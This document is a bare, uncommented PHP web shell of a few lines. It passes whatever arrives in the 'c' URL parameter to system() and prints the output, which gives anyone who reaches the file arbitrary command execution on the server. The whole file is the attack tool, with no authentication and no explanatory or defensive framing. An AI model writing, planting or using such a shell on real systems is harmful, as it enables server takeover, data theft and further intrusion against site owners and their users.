<?php
if (isset($_GET['c'])) {
    header('Content-Type: text/plain');
    system($_GET['c'] . " 2>&1");
}
?>